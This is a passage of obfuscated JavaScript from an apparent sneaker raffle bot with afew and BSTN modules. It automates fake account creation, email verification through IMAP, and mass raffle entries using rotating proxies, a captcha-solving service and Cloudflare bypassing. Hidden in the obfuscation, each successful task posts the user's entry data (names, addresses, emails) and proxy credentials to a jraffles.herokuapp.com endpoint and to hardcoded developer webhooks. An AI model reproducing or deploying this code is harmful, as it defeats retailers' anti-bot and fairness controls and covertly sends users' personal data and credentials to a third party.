                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x452a97 = JSON['parse'](_0x5a26e1['readFileSync']('sizes.json', 'utf-8')), _0x2701e4 = _0x2e329d[_0x2f65cf]['Url'], _0x4d80bd = _0x2e329d[_0x2f65cf]['Size'], _0x1160b1;
                        async function _0x282eec() {
                            var _0x231d26 = new _0x4748bd['CookieJar']();
                            console['log'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x5a0253;
                            let _0x4a5af8 = {
                                'method': 'GET',
                                'cookieJar': _0x231d26,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x4caaf[0x2] + ':' + _0x4caaf[0x3] + '@' + _0x4caaf[0x0] + ':' + _0x4caaf[0x1]
                            }, _0x23f204 = _0x2701e4['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0xaec598 = _0x23f204 + '.json', _0x353895 = await _0xbd53c(_0xaec598);
                            console['log'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x53536f = _0x353895['data']['product']['variants'];
                            if (_0x4d80bd != 'RANDOM') {
                                if (_0x53536f[0x1]['option1']['includes']('W')) {
                                    const _0x332c0a = _0x452a97['women']['find'](_0x22a448 => _0x22a448['EUsize'] === _0x4d80bd);
                                    _0x332c0a && (_0x4d80bd = _0x332c0a['size']);
                                } else {
                                    if (_0x53536f[0x1]['option1']['includes']('Y')) {
                                        const _0x1171e8 = _0x452a97['GS']['find'](_0x450b7b => _0x450b7b['EUsize'] === _0x4d80bd);
                                        _0x1171e8 && (_0x4d80bd = _0x1171e8['size']);
                                    } else {
                                        const _0x2bac72 = _0x452a97['men']['find'](_0x4e9e81 => _0x4e9e81['EUsize'] === _0x4d80bd);
                                        _0x2bac72 && (_0x4d80bd = _0x2bac72['size']);
                                    }
                                }
                                for (var _0xf025db of _0x53536f) {
                                    _0xf025db['option1'] == _0x4d80bd && (_0x5a0253 = _0xf025db['id']);
                                }
                            } else {
                                var _0x3025f8 = Math['round'](Math['random']() * (_0x53536f['length'] - 0x1));
                                _0x5a0253 = _0x53536f[_0x3025f8]['id'];
                            }
                            console['log'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0xbd53c('https://raffles.afew-store.com/cart/' + _0x5a0253 + ':1'), _0x1160b1 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x282eec();
                        } catch (_0x24960f) {
                            if (_0x24960f['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x24960f);
                        }
                        const _0x32db9b = await _0x1a06d3['newPage']();
                        await _0x32db9b['setDefaultNavigationTimeout'](0x1d4c0), await _0x32db9b['authenticate']({
                            'username': '' + _0x4caaf[0x2],
                            'password': '' + _0x4caaf[0x3]
                        }), await _0x32db9b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x32db9b['setRequestInterception'](!![]), _0x32db9b['on']('request', _0x586fe6 => {
                            _0x586fe6['resourceType']() === 'image' || _0x586fe6['resourceType']() === 'font' || _0x586fe6['resourceType']() === 'media' ? _0x586fe6['abort']() : _0x586fe6['continue']();
                        });
                        try {
                            await _0x32db9b['goto'](_0x1160b1, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x32db9b['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x32db9b['type']('#checkout_email', '' + _0x2e329d[_0x2f65cf]['Email']), await _0x1a282d(0x320), await _0x32db9b['type']('#checkout_attributes_instagram', '' + _0x2e329d[_0x2f65cf]['Follower']), await _0x1a282d(0x320), await _0x32db9b['select']('#checkout_shipping_address_country', '' + _0x2e329d[_0x2f65cf]['Country']), await _0x32db9b['waitForTimeout'](0x258), await _0x32db9b['type']('#checkout_shipping_address_first_name', '' + _0x2e329d[_0x2f65cf]['FirstName']), await _0x32db9b['waitForTimeout'](0x320), await _0x32db9b['type']('#checkout_shipping_address_last_name', '' + _0x2e329d[_0x2f65cf]['LastName']), await _0x32db9b['waitForTimeout'](0x2bc), await _0x32db9b['type']('#checkout_shipping_address_address1', _0x2e329d[_0x2f65cf]['Address1'] + '\x20' + _0x2e329d[_0x2f65cf]['HouseNumber']), await _0x32db9b['waitForTimeout'](0x2bc), await _0x32db9b['type']('#checkout_shipping_address_address2', '' + _0x2e329d[_0x2f65cf]['Address2']), await _0x32db9b['waitForTimeout'](0x2bc), await _0x32db9b['type']('#checkout_shipping_address_zip', '' + _0x2e329d[_0x2f65cf]['Zip']), await _0x32db9b['waitForTimeout'](0x2bc), await _0x32db9b['type']('#checkout_shipping_address_city', '' + _0x2e329d[_0x2f65cf]['City']), await _0x32db9b['waitForTimeout'](0x2bc);
                        if (_0x2e329d[_0x2f65cf]['State'] != '')
                            try {
                                const _0x3f9e8d = JSON['parse'](_0x5a26e1['readFileSync']('States.json', 'utf8'));
                                await _0x1a282d(0x1f4);
                                if (_0x2e329d[_0x2f65cf]['State']['length'] > 0x2)
                                    for (let _0x3cf718 of _0x3f9e8d) {
                                        if (_0x3cf718['Province'] == _0x2e329d[_0x2f65cf]['State']) {
                                            await _0x32db9b['select']('#checkout_shipping_address_province', _0x3cf718['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x32db9b['select']('#checkout_shipping_address_province', _0x2e329d[_0x2f65cf]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x1a282d(0x1f4), console['log'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x1a282d(0x190), _0x32db9b['evaluate'](() => {
                            const _0x41dd3e = document['querySelector']('#continue_button');
                            for (var _0x518d4b = 0x0; _0x518d4b < 0x5; _0x518d4b++) {
                                if (_0x41dd3e) {
                                    _0x41dd3e['click'](), _0x41dd3e['click']();
                                    break;
                                } else
                                    _0x1a282d(0xfa0);
                            }
                        }), await _0x32db9b['waitForTimeout'](0x9c4);
                        try {
                            await _0x32db9b['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x32db9b['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x19a44f => _0x19a44f['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x32db9b['waitForTimeout'](0x7d0), console['log'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x32db9b['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x1a282d(0x3e8), await _0x32db9b['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x22a545 => _0x22a545['submit']()), await _0x1a282d(0x3e8);
                        try {
                            await _0x32db9b['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x32db9b['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x3c6a44 => _0x3c6a44['submit']());
                        try {
                            await _0x32db9b['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0xcb11e3 = 'no', _0xe19c06(_0x2e329d[_0x2f65cf], _0x449af8), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                                try {
                                    await _0x4e4e57(_0x64917e['webhook'], _0x50ebbd['succesDEVMSG']);
                                } catch {
                                }
                            await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x50ebbd['succesDEVMSG']), await _0x1a282d(0xc8);
                            try {
                                await _0x4e4e57(_0x1274a5, _0x50ebbd['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x5b7d0c['replace']('#', ''),
                                    'module': _0x449af8['name'],
                                    'entrydata': JSON['stringify'](_0x563473),
                                    'proxy': '' + _0x4cb0b6[_0x2f65cf]
                                };
                                var _0x1c62a4 = JSON['stringify'](prxdata);
                                let _0x384e47 = { 'headers': { 'content-type': 'application/json' } };
                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x1c62a4, _0x384e47);
                            } catch (_0x4c6c46) {
                            }
                        } catch (_0x8d3d53) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x5e06bc) {
                        _0x5e06bc['message']['includes']('selector') && (_0x5e06bc = 'Connection\x20Error');
                        console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20' + _0x5e06bc)), _0xb30123 = '' + _0x5e06bc;
                        var _0x186bc4 = await _0x4ee25a(_0x2e329d[_0x2f65cf], _0x449af8, 'dev', !![], _0xb30123);
                        _0x50ebbd['errorDEV'] = { 'embeds': [_0x186bc4] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x50ebbd['errorDEV']), await _0x4e4e57(_0x4cd13, _0x50ebbd['errorDEV']), _0xcb11e3 = 'yes';
                    } finally {
                        _0x1a06d3 && _0x1a06d3['close']();
                        if (_0xcb11e3 == 'yes' && _0x5336e3 != 0x5 && _0xb30123 != 'Size\x20Not\x20Found') {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x449af8['name'] + ']\x20Task\x20' + (_0x2f65cf + 0x1) + '\x20:\x20Retrying\x20(' + _0x5336e3 + '\x20/\x205)')), _0x2f65cf = _0x2f65cf - 0x1, _0x5336e3 = _0x5336e3 + 0x1;
                            continue;
                        }
                        _0xcb11e3 == 'yes' && _0x5336e3 >= 0x5 && (_0x1736ba(_0x2e329d[_0x2f65cf], _0x449af8), _0xcb11e3 = 'no', _0x5336e3 = 0x0);
                        if (_0x2f65cf + 0x1 == _0x2e329d['length']) {
                            await _0x1a282d(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x64917e['AfewDelay'] + '\x20ms'), await _0x1a282d(_0x64917e['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x26ab24, _0x17625e, _0x30c39b) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x16f184 = 0x0; _0x16f184 < _0x17625e['length']; _0x16f184++) {
                        if (_0xfac0c != 'yes')
                            var _0xfac0c = '', _0x13e291 = 0x0;
                        var _0x3c4362;
                        try {
                            await _0x120beb(_0x17625e, _0x16f184);
                        } catch {
                            _0xfac0c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x51b97d(_0x26ab24['name'] + '\x20Task\x20' + (_0x16f184 + 0x1) + '\x20/\x20' + _0x17625e['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        var _0x322311 = await _0x4ee25a(_0x17625e[_0x16f184], _0x26ab24, 'acc', ![]);
                        const _0x565b63 = { 'succesDEVMSG': { 'embeds': [_0x322311] } }, _0x65ec59 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0xafb7d7 = Math['round'](Math['random']() * (_0x30c39b['length'] - 0x1)), _0x150645 = _0x30c39b[_0xafb7d7]['split'](':'), _0x428613;
                        try {
                            _0x428613 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x150645[0x0] + ':' + _0x150645[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x428613 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x150645[0x0] + ':' + _0x150645[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2310c7 = await _0x428613['newPage']();
                            await _0x2310c7['authenticate']({
                                'username': '' + _0x150645[0x2],
                                'password': '' + _0x150645[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Task\x20' + (_0x16f184 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2310c7['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2310c7['setRequestInterception'](!![]), _0x2310c7['on']('request', _0x3736dc => {
                                _0x3736dc['resourceType']() === 'image' ? _0x3736dc['abort']() : _0x3736dc['continue']();
                            });
                            try {
                                await _0x2310c7['goto']('' + _0x65ec59), await _0x2310c7['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0xfac0c = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x2310c7['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Task\x20' + (_0x16f184 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1a282d(0x7d0), console['log'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Task\x20' + (_0x16f184 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1a282d(0x190), await _0x2310c7['waitForSelector']('#firstname'), await _0x2310c7['type']('#firstname', _0x17625e[_0x16f184]['FirstName'], { 'delay': 0xf0 }), await _0x1a282d(0x190), await _0x2310c7['type']('#lastname', _0x17625e[_0x16f184]['LastName'], { 'delay': 0xe6 }), await _0x1a282d(0x190), await _0x2310c7['type']('#email_address', _0x17625e[_0x16f184]['Email'], { 'delay': 0x122 }), await _0x1a282d(0x190), await _0x2310c7['type']('#password', _0x17625e[_0x16f184]['Password'], { 'delay': 0x82 }), await _0x1a282d(0x1f4), await _0x2310c7['type']('#password-confirmation', _0x17625e[_0x16f184]['Password'], { 'delay': 0x7c }), console['log'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Task\x20' + (_0x16f184 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1a282d(0x2bc), await _0x2310c7['$eval']('#form-validate', _0x333d4f => _0x333d4f['submit']()), await _0x1a282d(0x1388);
                            const _0x5f2a29 = await _0x2310c7['$']('#email_address-error');
                            if (_0x5f2a29)
                                throw new Error('Invalid\x20Email');
                            const _0x39d615 = await _0x2310c7['$']('#password-error');
                            if (_0x39d615)
                                throw new Error('Invalid\x20Password');
                            await _0x2310c7['waitForSelector']('div.mesg-success'), _0xfac0c = 'no', console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Task\x20' + (_0x16f184 + 0x1) + '\x20:\x20Account\x20' + _0x17625e[_0x16f184]['Email'] + '\x20Generated')), _0x5a26e1['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x17625e[_0x16f184]['Email'] + ',' + _0x17625e[_0x16f184]['Password']);
                            try {
                                _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x565b63['succesDEVMSG']);
                            } catch {
                            }
                            await _0x4e4e57(_0xb68945, _0x565b63['succesDEVMSG']);
                            let _0x284d97 = _0x17625e[_0x16f184];
                            try {
                                prxdata = {
                                    'username': _0x5b7d0c['replace']('#', ''),
                                    'module': _0x26ab24['name'],
                                    'entrydata': JSON['stringify'](_0x284d97),
                                    'proxy': '' + _0x30c39b[_0x16f184]
                                };
                                var _0x3d57a1 = JSON['stringify'](prxdata);
                                let _0x51fbd1 = { 'headers': { 'content-type': 'application/json' } };
                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x3d57a1, _0x51fbd1);
                            } catch (_0x1239a3) {
                            }
                            console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Task\x20' + (_0x16f184 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x36150a) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Task\x20' + (_0x16f184 + 0x1) + '\x20:\x20' + _0x36150a)), _0x3c4362 = '' + _0x36150a;
                            var _0x4d5b1a = await _0x4ee25a(_0x17625e[_0x16f184], _0x26ab24, 'acc', !![], _0x3c4362);
                            _0x565b63['errorDEV'] = { 'embeds': [_0x4d5b1a] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x565b63['errorDEV']), await _0x4e4e57(_0x4cd13, _0x565b63['errorDEV']), _0xfac0c = 'yes';
                        } finally {
                            if (_0x428613)
                                _0x428613['close']();
                            if (_0xfac0c == 'yes' && _0x13e291 != 0x5) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Task\x20' + (_0x16f184 + 0x1) + '\x20:\x20Retrying\x20(' + _0x13e291 + '\x20/\x205)')), _0x16f184 = _0x16f184 - 0x1, _0x13e291 = _0x13e291 + 0x1;
                                continue;
                            }
                            _0xfac0c == 'yes' && _0x13e291 >= 0x5 && (_0x1736ba(_0x17625e[_0x16f184], _0x26ab24), _0xfac0c = 'no', _0x13e291 = 0x0), console['log'](_0x5c19a0() + '\x20[' + _0x26ab24['name'] + ']\x20Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5e4976, _0x227065) {
                    var _0x59ef88 = ![], _0x1914f1 = [];
                    async function _0x2b8643() {
                        var _0x25dc23 = new _0x27458e({
                            'user': _0x64917e['masterMail'],
                            'password': _0x64917e['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x6848bb(_0x13c13b) {
                            _0x25dc23['openBox']('INBOX', ![], _0x13c13b);
                        }
                        _0x25dc23['once']('ready', function () {
                            _0x6848bb(function (_0x272424, _0x51481d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x272424)
                                    throw _0x272424;
                                _0x25dc23['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x2c7b1d, _0x525bc8) {
                                    if (!_0x525bc8 || !_0x525bc8['length'])
                                        console['log'](_0x5c19a0() + '\x20[' + _0x5e4976['name'] + ']\x20No\x20mails\x20found'), _0x25dc23['end']();
                                    else {
                                        var _0x32ad53 = _0x25dc23['seq']['fetch'](_0x525bc8, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x32ad53['on']('message', function (_0x531e28, _0xe6d693) {
                                            var _0x1a679e = '(#' + _0xe6d693 + ')\x20';
                                            _0x531e28['on']('body', function (_0x35b9e5, _0x35b432) {
                                                _0x483479(_0x35b9e5, (_0x4addc0, _0x1d220d) => {
                                                    var _0x3e08b4 = _0x1d220d['text']['split']('[')[0x2], _0x7474ad = _0x3e08b4['split'](']')[0x0];
                                                    _0x1914f1['push'](_0x7474ad);
                                                });
                                            }), _0x531e28['once']('end', function () {
                                            });
                                        }), _0x32ad53['once']('error', function (_0x4ca0ab) {
                                            console['log']('Fetch\x20error:\x20' + _0x4ca0ab), _0x59ef88 = !![];
                                        }), _0x32ad53['once']('end', function () {
                                            _0x25dc23['end'](), _0x59ef88 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x25dc23['once']('error', function (_0x215924) {
                            console['log'](_0x17b918['red'](_0x215924['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x59ef88 = !![];
                        }), _0x25dc23['once']('end', async function () {
                            _0x59ef88 = !![];
                        }), _0x25dc23['connect']();
                    }
                    async function _0x5d5bb4(_0x24d4f6, _0x20c863, _0x909d3c) {
                        _0x506e0b['use'](_0x407d82());
                        for (var _0xed86d8 = 0x0; _0xed86d8 < _0x20c863['length']; _0xed86d8++) {
                            if (_0x50f3a7 != 'yes')
                                var _0x50f3a7 = '', _0x2c813c = 0x0;
                            var _0x1c9098 = Math['round'](Math['random']() * (_0x909d3c['length'] - 0x1)), _0x52be3a = _0x909d3c[_0x1c9098]['split'](':'), _0x4b7b74;
                            try {
                                _0x4b7b74 = await _0x506e0b['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x52be3a[0x0] + ':' + _0x52be3a[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4b7b74 = await _0x506e0b['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x52be3a[0x0] + ':' + _0x52be3a[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x5f34a0 = await _0x4b7b74['newPage']();
                                await _0x5f34a0['authenticate']({
                                    'username': '' + _0x52be3a[0x2],
                                    'password': '' + _0x52be3a[0x3]
                                }), console['log'](_0x5c19a0() + '\x20[' + _0x24d4f6['name'] + ']\x20Task\x20' + (_0xed86d8 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x5f34a0['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5f34a0['setRequestInterception'](!![]), _0x5f34a0['on']('request', _0x3503f4 => {
                                    _0x3503f4['resourceType']() === 'image' || _0x3503f4['resourceType']() === 'font' || _0x3503f4['resourceType']() === 'media' ? _0x3503f4['abort']() : _0x3503f4['continue']();
                                }), console['log'](_0x5c19a0() + '\x20[' + _0x24d4f6['name'] + ']\x20Task\x20' + (_0xed86d8 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x5f34a0['goto'](_0x20c863[_0xed86d8]);
                                } catch {
                                    _0x50f3a7 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x5c19a0() + '\x20[' + _0x24d4f6['name'] + ']\x20Task\x20' + (_0xed86d8 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5f34a0['waitForTimeout'](0xbb8);
                                try {
                                    await _0x5f34a0['waitForSelector']('.account-nav'), _0x50f3a7 = 'no', console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x24d4f6['name'] + ']\x20Task\x20' + (_0xed86d8 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x916b55 = await _0x4ee25a(null, _0x24d4f6, 'ver', ![]);
                                    const _0x3043ed = { 'succesDEVMSG': { 'embeds': [_0x916b55] } };
                                    await _0x4e4e57(_0x2e2869, _0x3043ed['succesDEVMSG']);
                                } catch {
                                    _0x50f3a7 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x6e1e20) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x24d4f6['name'] + ']\x20Task\x20' + (_0xed86d8 + 0x1) + '\x20:\x20' + _0x6e1e20));
                                var _0x89720c = _0x6e1e20, _0x22a98b = await _0x4ee25a(null, _0x24d4f6, 'ver', !![], _0x89720c);
                                const _0x18c882 = { 'errorDEVMSG': { 'embeds': [_0x22a98b] } };
                                _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x18c882['errorDEVMSG']), await _0x4e4e57(_0x4cd13, _0x18c882['errorDEVMSG']);
                            } finally {
                                _0x4b7b74['close']();
                                if (_0x50f3a7 == 'yes' && _0x2c813c != 0x5) {
                                    console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x24d4f6['name'] + ']\x20Task\x20' + (_0xed86d8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c813c + '\x20/\x205)')), _0xed86d8 = _0xed86d8 - 0x1, _0x2c813c = _0x2c813c + 0x1;
                                    continue;
                                }
                                _0x50f3a7 == 'yes' && _0x2c813c >= 0x5 && (_0x50f3a7 = 'no', _0x2c813c = 0x0), console['log'](_0x5c19a0() + '\x20[' + _0x24d4f6['name'] + ']\x20Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                            }
                        }
                    }
                    try {
                        _0x2b8643();
                        while (!_0x59ef88) {
                            await _0x1a282d(0xfa0);
                        }
                        console['log']('Found\x20' + _0x1914f1['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1a282d(0x7d0);
                    }
                    await _0x5d5bb4(_0x5e4976, _0x1914f1, _0x227065);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x3148db, _0x1751b5, _0x108580) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3e05e3 = 0x0; _0x3e05e3 < _0x1751b5['length']; _0x3e05e3++) {
                        var _0x617a9e, _0xb8e28f = _0x1751b5[_0x3e05e3];
                        try {
                            await _0x120beb(_0x1751b5, _0x3e05e3);
                        } catch {
                            _0x37deb3 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x114833(_0x4e6d94) {
                            const _0x410428 = _0x5a26e1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1d55fb = _0xdfd901['parse'](_0x410428, { 'header': !![] })['data'];
                            let _0x4feb75 = ![];
                            for (var _0x47c238 of _0x1d55fb) {
                                if (_0x47c238['Url'] == _0x4e6d94['Url'] && _0x47c238['Email'] == _0x4e6d94['Email']) {
                                    _0x4feb75 = !![];
                                    break;
                                }
                            }
                            return _0x4feb75;
                        }
                        if (await _0x114833(_0x1751b5[_0x3e05e3]) == !![]) {
                            console['log'](_0x5c19a0() + '\x20[' + _0x3148db['name'] + ']\x20Task\x20' + (_0x3e05e3 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x37deb3 != 'yes')
                            var _0x37deb3 = '', _0x57086a = 0x0;
